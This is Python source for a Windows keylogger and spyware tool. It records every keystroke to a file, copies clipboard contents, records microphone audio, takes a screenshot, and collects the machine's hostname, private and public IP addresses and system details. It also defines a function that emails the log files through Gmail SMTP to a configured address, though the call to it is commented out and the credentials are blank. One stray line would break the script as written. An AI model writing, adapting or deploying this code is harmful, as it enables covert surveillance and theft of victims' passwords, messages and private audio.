from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform
from win32 import win32clipboard

from pynput.keyboard import Key , Listener 

import time
import os

from scipy.io.wavfile import write

import sounddevice as sd

from cryptography.fernet import Fernet
import getpass
from requests import get


from multiprocessing import process,freeze_support
from PIL import ImageGrab

keys_info="key_log.txt"
file_path="C:\\Users\\dines\\OneDrive\\Desktop\\kwy"
extend="\\"
file_merge =file_path + extend
clipboard_info ="clipinfo.txt"
audio_info = "audioinfo.wav"
micro_ph=10
screenshot_info= "screen.png"
time_iteration=15
system_info = "system_info.txt"

count=0
keys=[]
email_add = " " # add email
password = "  " #add email password

toaddr = " " #add send email
send to email
def send_email(filename, attachment, toaddr):

    fromaddr = email_add
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "dinesh sending log file"
    body = "the log of the key logger"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    d = MIMEBase('application', 'octet-stream')
    d.set_payload((attachment).read())
    encoders.encode_base64(d)
    d.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(d)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()
# send_email(keys_info ,file_path + extend + keys_info, toaddr)



#get computer info
def cpinfo():
    with open(file_path + extend + system_info, "a") as f:
        hostname =socket.gethostname()
        ipaddrs = socket.gethostbyname(hostname)
        try:
            public_ip =get("https://api.ipify.org").text
            f.write("public ip addres : " + public_ip + " " + '\n')
        except Exception:
            f.write("cannot get the public ip")

        f.write("procerrs_info:" +(platform.processor()) + '\n')
        f.write("sys_info: " + platform.system() + " " + platform.version() + '\n')
        f.write("machine_info: " + platform.machine() + '\n')
        f.write("hostname: " + hostname + '\n')
        f.write("private ip: " + ipaddrs + '\n')

cpinfo()

#get clipboard info
def cpy_clipboard():
    with open(file_path + extend + clipboard_info, 'a' ) as f:
        try:
            win32clipboard.OpenClipboard()
            paste_data=win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("clipboard data : " + paste_data )
        except:
            f.write("clipboard cannot be copied")    


cpy_clipboard()

#get microphone info
def microP():
    fh = 44100
    sec = micro_ph

    myrec =sd.rec(int(sec * fh), samplerate=fh, channels=2)
    sd.wait()

    write(file_path + extend + audio_info,fh, myrec )
microP()
#get screenshot
def screen():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_info)

screen()


def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1
    
    if count >= 1:
        count =0
        write_file(keys)
        keys=[]


def write_file(keys):
    with open(file_path + extend + keys_info, "a") as f:     # a for append call as f 
        for key in keys:
            d  = str(key).replace("'","")
            if d.find("space") >0:
                f.write('\n')
                f.close()
            elif d.find("key") == -1:
                f.write(d)
                f.close()    


def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press,on_release=on_release)   as listener:
    listener.join()
